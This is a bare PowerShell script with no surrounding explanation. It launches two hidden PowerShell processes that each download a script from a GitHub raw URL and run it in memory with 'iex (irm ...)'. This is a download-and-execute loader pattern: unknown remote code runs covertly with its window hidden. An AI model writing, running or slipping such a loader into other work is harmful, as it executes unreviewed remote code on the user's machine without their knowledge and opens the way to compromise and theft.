$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell.exe"
$psi.Arguments = "-Command `"iex (irm 'https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/single-run.ps1')`""
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden

# Start two processes concurrently
$process1 = [System.Diagnostics.Process]::Start($psi)
$process2 = [System.Diagnostics.Process]::Start($psi)